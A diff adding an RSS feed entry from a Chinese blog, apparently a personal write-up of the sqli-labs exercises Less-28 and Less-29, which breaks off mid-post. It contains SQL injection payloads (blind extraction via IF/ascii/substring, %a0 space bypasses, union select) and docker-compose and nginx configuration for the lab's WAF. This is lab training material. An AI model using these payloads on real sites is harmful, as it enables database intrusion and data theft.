@@ -1,0 +1,1342 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>sqli-labs on weakptr's 笔记</title><link>https://weakptr.site/tags/sqli-labs/</link><description>Recent content in sqli-labs on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 13 May 2022 15:04:43 +0800</lastBuildDate><atom:link href="https://weakptr.site/tags/sqli-labs/index.xml" rel="self" type="application/rss+xml"/><item><title>sqli-labs 实验记录 #5</title><link>https://weakptr.site/p/sqli-labs-training-5/</link><pubDate>Fri, 13 May 2022 15:04:43 +0800</pubDate><guid>https://weakptr.site/p/sqli-labs-training-5/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>惯例。&lt;/p>
+&lt;p>随便刷两题。&lt;/p>
+&lt;h2 id="less-28">Less-28&lt;/h2>
+&lt;p>没有错误回显，有查询结果。提示 all your &amp;lsquo;union&amp;rsquo; and &amp;lsquo;select&amp;rsquo; belongs to us ，和 27 一样的提示，不同的是 union 和 select 加了引号。不知道想表达什么。&lt;/p>
+&lt;p>验证注入类型 &lt;code>?id=1' and '1'='1&lt;/code> + &lt;code>?id=1' and '1'='0&lt;/code> 确定是字符型注入，单引号。注意服务端可能有个类型转换导致 &lt;code>1 and 1=1&lt;/code> 这样的 payload 也有回显，通过构造为假的条件可以发现并不是数字型注入。&lt;/p>
+&lt;p>从提示看是过滤了 union 和 select 但不知道怎么过滤的，尝试双写 bypass，发现空格被过滤了。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513094655242.png"
+width="1172"
+height="244"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513094655242_huccd33fbbc1c70cf92076cd51502fa4a4_26879_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513094655242_huccd33fbbc1c70cf92076cd51502fa4a4_26879_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513094655242"
+class="gallery-image"
+data-flex-grow="480"
+data-flex-basis="1152px"
+>&lt;/p>
+&lt;p>尝试&lt;code>/**/&lt;/code>替换空格 bypass ，发现依然无效。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513094741744.png"
+width="1158"
+height="246"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513094741744_hu4e8d6554a01e98a5ba4e8a820ad268ce_27124_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513094741744_hu4e8d6554a01e98a5ba4e8a820ad268ce_27124_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513094741744"
+class="gallery-image"
+data-flex-grow="470"
+data-flex-basis="1129px"
+>&lt;/p>
+&lt;p>尝试 &lt;code>0xa0&lt;/code> 替换空格。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513095047414.png"
+width="1200"
+height="252"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513095047414_hue2fb6ad088b6e55ab603e637b9a99ad0_33575_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513095047414_hue2fb6ad088b6e55ab603e637b9a99ad0_33575_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513095047414"
+class="gallery-image"
+data-flex-grow="476"
+data-flex-basis="1142px"
+>&lt;/p>
+&lt;p>看起来ok了，但看起来完全没过滤 union 和 select ，把双写去除后重试，依然没有回显，茫然。&lt;/p>
+&lt;p>好吧，重新整理思路。先测试下过滤了什么东西 &lt;code>?id=0'&amp;quot;;--%23/**/union,select&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513095828806.png"
+width="1045"
+height="254"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513095828806_hu3b595d65dcd9cc8de4a1ce7526d0d3b1_23651_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513095828806_hu3b595d65dcd9cc8de4a1ce7526d0d3b1_23651_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513095828806"
+class="gallery-image"
+data-flex-grow="411"
+data-flex-basis="987px"
+>&lt;/p>
+&lt;p>注意到只剩下了 &lt;code>'&amp;quot;;&lt;/code> 幸存，前面有个双写和&lt;code>%a0union%a0&lt;/code>没被替换，所以初步怀疑正则可能是&lt;code>\b(union|select)\b&lt;/code>。尝试大小写也被过滤了，所以正则匹配应该还有个 &lt;code>i&lt;/code> 标志。&lt;/p>
+&lt;p>这种情况我有个思路是走盲注，用&lt;code>AND IF(...)&lt;/code>爆破。尝试&lt;code>?id=1'%a0and%a0if(ascii(substring(password,1,1))&amp;gt;0,true,false)%a0and%a0'1'='1&lt;/code> 有回显，条件改成&lt;code>&amp;lt;0&lt;/code>则无回显。继续爆破即可。&lt;/p>
+&lt;p>再给其他人的思路参考：&lt;/p>
+&lt;ul>
+&lt;li>审阅代码可知正则并不是我猜测的&lt;code>\b(union|select)\b&lt;/code>，而是&lt;code>union\s+select&lt;/code>，因此可以被&lt;code>%a0&lt;/code>绕过，正常&lt;code>union select&lt;/code> 或者 &lt;code>union all select&lt;/code> 可破。&lt;/li>
+&lt;/ul>
+&lt;h2 id="less-29">Less-29&lt;/h2>
+&lt;p>提示 protection with WAF, this site protected by world&amp;rsquo;s best firewall.&lt;/p>
+&lt;p>测试过滤了什么东西。&lt;code>?id=1'&amp;quot;;--%23/**/%20select,union,and,or,SeLect,UniOn,seselectlect,uniunionon&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513103434746.png"
+width="1734"
+height="89"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513103434746_hubce0d817c4d63d33fd9ff2720c3a3d00_13380_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513103434746_hubce0d817c4d63d33fd9ff2720c3a3d00_13380_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513103434746"
+class="gallery-image"
+data-flex-grow="1948"
+data-flex-basis="4675px"
+>&lt;/p>
+&lt;p>发现什么都没过滤，看起来是单引号字符型注入。尝试 Less-28 的盲注 payload 发现成功。什么鬼？&lt;/p>
+&lt;p>尝试 &lt;code>?id=0' union select 1,version(),database() --%20&lt;/code> 发现也直接成功。&lt;/p>
+&lt;p>WAF，看看你都保护了个啥。&lt;/p>
+&lt;h3 id="waf设置">WAF设置&lt;/h3>
+&lt;p>经查，原来是我挑的这个分支 docker-compose 部署有问题=。=&lt;/p>
+&lt;p>WAF 并不属于 PHP，而是 jsp 的，在仓库目录下有个 &lt;code>tomcat.zip&lt;/code> 保存了 WAF 的内容，需要单独部署。&lt;/p>
+&lt;p>参考&lt;a class="link" href="https://www.jianshu.com/p/46cb6c354de5" target="_blank" rel="noopener"
+>sqli-labs: Less-29 - Less-31&lt;/a> 这篇文章了解到架构大体上就是 tomcat 过滤参数后反代 apache 服务，但仔细看了下 WAF 内容发现没有对 Less-29~Less-32 之外的页面反代，导致把 tomcat 挂在 80 端口的话就访问不到其他没设置 WAF 的页面。&lt;/p>
+&lt;p>合理的架构应该是这样。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513135801459.png"
+width="644"
+height="270"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513135801459_hu920b318a879aa14835f862755577c731_27482_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513135801459_hu920b318a879aa14835f862755577c731_27482_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513135801459"
+class="gallery-image"
+data-flex-grow="238"
+data-flex-basis="572px"
+>&lt;/p>
+&lt;p>修改 &lt;code>docker-compose.yaml&lt;/code> 如下&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;3&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">services&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">reverseproxy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;nginx:mainline&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">web&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">waf&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">ports&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="m">80&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">80&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">web:web&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">waf:waf&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./etc/nginx_default.conf:/etc/nginx/conf.d/default.conf&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">db&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;mysql:5.7.33&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">environment&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">MYSQL_ROOT_PASSWORD&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">toor&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">MYSQL_ROOT_HOST&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;%&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">ports&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="m">3306&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">3306&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">web&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">db&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;php:5.3-apache&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;.:/var/www/html&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./etc/apache_default:/etc/apache2/sites-available/000-default.conf&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./etc/htaccess:/var/www/html/.htaccess&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">environment&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">DB_HOST&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;db&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">DB_PASS&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;toor&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">db:db&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">waf&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">db&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;tomcat:jre8-openjdk-bullseye&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./WAF/sqli-labs:/usr/local/tomcat/webapps&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./mysql-connector-java.jar:/usr/local/tomcat/lib/mysql-connector-java.jar&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">db:db&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="l">web:web&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>添加&lt;code>waf&lt;/code>和&lt;code>reverseproxy&lt;/code>，&lt;code>waf&lt;/code>用&lt;code>tomcat&lt;/code>官方容器不需要配置，但源码&lt;code>index.jsp&lt;/code>里请求地址要改。还要从 MySQL 官网单独下载一个 &lt;code>mysql-connector-java&lt;/code> 的 jar 包挂载进去。&lt;/p>
+&lt;p>&lt;code>reverseproxy&lt;/code> 用 &lt;code>nginx:mainline&lt;/code>，简单配一下反代规则。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-nginx" data-lang="nginx">&lt;span class="line">&lt;span class="cl">&lt;span class="k">upstream&lt;/span> &lt;span class="s">lab&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">server&lt;/span> &lt;span class="s">web&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">upstream&lt;/span> &lt;span class="s">tomcat&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">server&lt;/span> &lt;span class="n">waf&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">server&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">listen&lt;/span> &lt;span class="mi">80&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">listen&lt;/span> &lt;span class="s">[::]:80&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">server_name&lt;/span> &lt;span class="s">localhost&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">location&lt;/span> &lt;span class="s">/&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">proxy_pass&lt;/span> &lt;span class="s">http://lab&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">proxy_set_header&lt;/span> &lt;span class="s">Host&lt;/span> &lt;span class="nv">$http_host&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">proxy_set_header&lt;/span> &lt;span class="s">X-Real-IP&lt;/span> &lt;span class="nv">$remote_addr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">location&lt;/span> &lt;span class="p">~&lt;/span> &lt;span class="sr">^/Less-(29|30|31|32)[a-zA-Z]?/&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">proxy_pass&lt;/span> &lt;span class="s">http://tomcat&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">proxy_set_header&lt;/span> &lt;span class="s">Host&lt;/span> &lt;span class="nv">$http_host&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">proxy_set_header&lt;/span> &lt;span class="s">X-Real-IP&lt;/span> &lt;span class="nv">$remote_addr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>到这一步就应该能同时访问 WAF 和其他题目了。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513140140027.png"
+width="1339"
+height="629"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513140140027_hu59b49e8b56be885038de39fb4bac57a5_457416_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513140140027_hu59b49e8b56be885038de39fb4bac57a5_457416_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513140140027"
+class="gallery-image"
+data-flex-grow="212"
+data-flex-basis="510px"
+>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513140239000.png"
+width="1395"
+height="632"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513140239000_hu5e114f83468c3e0191de9526b05f3db1_450543_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513140239000_hu5e114f83468c3e0191de9526b05f3db1_450543_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513140239000"
+class="gallery-image"
+data-flex-grow="220"
+data-flex-basis="529px"
+>&lt;/p>
+&lt;h3 id="重新解题">重新解题&lt;/h3>
+&lt;p>审阅下WAF代码。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;%
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">// ... 略
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">String rex = &amp;#34;^\\d+$&amp;#34;;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Boolean match = id.matches(rex);
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">if(match==true) {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> // ... 请求 web 服务
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">} else {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> response.sendRedirect(&amp;#34;hacked.jsp&amp;#34;);
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>看起来无懈可击，正则匹配整个&lt;code>id&lt;/code>参数必须是纯数字。再看下 Less-29 原题代码，&lt;code>select * from users where id='$id' limit 0,1&lt;/code>，好了这题我确实不懂了，知识盲区。看别的大佬的题解：&lt;/p>
+&lt;blockquote>
